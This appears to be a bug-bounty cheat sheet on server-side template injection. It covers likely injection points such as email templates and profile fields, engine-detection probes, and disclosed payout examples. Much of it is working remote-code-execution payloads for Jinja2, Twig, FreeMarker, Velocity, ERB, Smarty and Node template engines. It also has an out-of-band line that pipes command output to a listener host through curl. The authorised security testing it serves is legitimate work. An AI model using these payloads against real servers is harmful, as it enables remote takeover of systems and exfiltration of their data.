# SSTI — Server-Side Template Injection (deep)

User input reaches a template engine that evaluates it server-side → often RCE. Paid patterns (H1): Uber
*uber.com RCE via Flask/Jinja2 SSTI* **$10k**; Mail.ru *path traversal + SSTI + RCE* **$2k**; GitHub
Security Lab *Ruby SSTI* **$2.3k**; plus disclosed Shopify (Return Magic email templates), Unikrn (Smarty
→ RCE), Glovo (signup **Name** parameter), curl (SSTI → command injection).

## Where it lives (the fields that actually pay)
- **Email/notification templates** — welcome, invoice, password-reset, alert emails with `{{name}}`,
  `{{company}}`, custom-template features (marketing/CMS). Injection at set time, execution at send time.
- **Profile/identity fields rendered later** — display name, username, org name, bio, custom subdomain
  (Glovo signup name paid here). Set it, then trigger the page/email that renders it.
- **Report / PDF / document generators**, error pages, i18n strings, custom "liquid/handlebars/smarty" builders.

## Detect (identify the engine)
Fire the polyglot, then a math probe; see which evaluates:
```
${{<%[%'"}}%\           # breaks/echoes across engines — a hard error narrows the engine
{{7*7}} → 49            # Jinja2 / Twig / Nunjucks
${7*7} → 49            # FreeMarker / Velocity / Thymeleaf / JSP EL
#{7*7} → 49            # Ruby (Slim/ERB interpolation) / Thymeleaf
<%= 7*7 %> → 49        # ERB / EJS
{7*7} → 49             # Smarty / Handlebars-ish
{{7*'7'}} → 7777777    # Jinja2 (vs Twig → 49) — disambiguates the two
```

## Engine → RCE
```jinja2
# Jinja2 (Python/Flask) — Uber $10k
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```twig
# Twig (PHP)
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
```
# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity (Java)
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",...)...
# ERB / Ruby — $2.3k
<%= system('id') %>    <%= `id` %>    <%= IO.popen('id').read %>
# Smarty (PHP) — Unikrn
{system('id')}    {php}system('id');{/php}
# Nunjucks / Handlebars / Pug (Node) — constructor chain
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## Blind / OOB SSTI
No reflected output (email templates) → use OOB: `{{...os.popen('curl http://OOB/$(whoami)')...}}` or a
time delay, and confirm via your listener / response latency.

## Proof-of-impact bar
Show command output, an OOB hit, or file read. `{{7*7}}→49` alone proves injection but **escalate to RCE**
(or a concrete read) before reporting — pure `49` reflection is often downgraded. SSTI→RCE = CVSS 9.x.
Distinguish from client-side template injection (Angular/Vue) — that's XSS, different file ([payloads.md](payloads.md)).
